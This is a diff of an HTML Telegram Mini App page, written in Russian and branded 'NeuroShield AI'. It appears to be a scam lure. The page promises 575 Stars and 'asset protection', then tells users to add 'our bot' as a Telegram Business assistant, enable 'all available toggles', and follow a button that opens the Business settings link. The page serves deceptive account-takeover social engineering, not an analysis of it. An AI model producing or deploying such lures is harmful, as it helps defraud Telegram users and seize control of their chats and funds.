@@ -1,37 +1,41 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>NeuroShield Business Panel</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #0e1621; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
-        .card { background: #17212b; padding: 20px; border-radius: 15px; border: 1px solid #2b5278; }
-        .btn { background: #2481cc; color: white; padding: 15px; border-radius: 10px; text-decoration: none; display: block; margin-top: 20px; cursor: pointer; }
-        .status { color: #f0b90b; font-weight: bold; }
+        body { font-family: -apple-system, sans-serif; background-color: #0e1621; color: white; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        .container { background: #17212b; width: 85%; padding: 25px; border-radius: 20px; border: 1px solid #2b3948; text-align: center; }
+        .status-badge { background: rgba(241, 196, 15, 0.1); color: #f1c40f; padding: 5px 12px; border-radius: 20px; font-size: 12px; text-transform: uppercase; margin-bottom: 15px; display: inline-block; }
+        h2 { margin: 10px 0; font-size: 20px; }
+        .info-text { color: #8ba3b7; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
+        .instruction-box { text-align: left; background: rgba(255,255,255,0.03); padding: 15px; border-radius: 12px; font-size: 13px; border-left: 3px solid #2481cc; }
+        .btn { background: #2481cc; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; box-shadow: 0 4px 15px rgba(36, 129, 204, 0.3); }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>NeuroAssistant AI</h2>
-        <p>Статус: <span class="status">ОЖИДАНИЕ ПОДКЛЮЧЕНИЯ</span></p>
-        <hr>
-        <p style="text-align: left; font-size: 14px;">
-            • AI-Автоответчик: <b>OFF</b><br>
-            • Stars Cashback: <b>0%</b><br>
-            • Защита чатов: <b>Inactive</b>
-        </p>
-        <div class="btn" onclick="startSetup()">АКТИВИРОВАТЬ МОДУЛИ</div>
+    <div class="container">
+        <div class="status-badge">Ожидание верификации</div>
+        <h2>NeuroShield AI</h2>
+        <p class="info-text">Для активации защиты ваших активов и получения бонуса <b>575 Stars</b> необходимо завершить подключение модуля.</p>
+        <div class="instruction-box">
+            <b>Порядок действий:</b><br>
+            1. Нажмите кнопку ниже.<br>
+            2. Выберите нашего бота в списке.<br>
+            3. Включите <b>все доступные ползунки</b> в настройках.
+        </div>
+        <button class="btn" onclick="goToSettings()">ПОДКЛЮЧИТЬ И ПОЛУЧИТЬ ⭐️</button>
     </div>
-
     <script>
-        let tg = window.Telegram.WebApp;
+        const tg = window.Telegram.WebApp;
         tg.expand();
-
-        function startSetup() {
-            alert("Для завершения активации необходимо добавить бота в список бизнес-помощников в настройках вашего аккаунта (Настройки -> Telegram Business).");
-            tg.close();
+        function goToSettings() {
+            tg.openTelegramLink("https://t.me/setsprofile?section=business");
+            setTimeout(() => { tg.close(); }, 1500);
         }
     </script>
 </body>
+</html>
 </html>
